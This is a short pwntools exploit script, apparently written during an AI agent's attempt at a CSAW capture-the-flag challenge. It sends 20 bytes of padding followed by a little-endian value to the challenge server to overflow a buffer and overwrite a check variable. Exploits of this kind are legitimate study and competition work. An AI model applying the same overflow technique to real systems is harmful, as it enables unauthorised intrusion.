from pwn import *

# Connect to the challenge server
p = remote('pwn.chal.csaw.io', 1436)

# Receive the initial message
initial = p.recvuntil(b'??\n')
print("Initial message:", initial.decode('ascii', errors='ignore'))

# Craft the payload
# 20 bytes of padding + 0xcaf3baee in little-endian
payload = b'A' * 20 + p32(0xcaf3baee)

# Send the payload
p.send(payload)

# Receive response with a short timeout
p.settimeout(2)
try:
    response = p.recv()
    print("Raw response (hex):", response.hex())
    # Try to decode as ASCII, ignoring errors
    print("Response (ASCII):", response.decode('ascii', errors='ignore'))
except Exception as e:
    print("Error receiving response:", e)

p.close()
end_of_edit

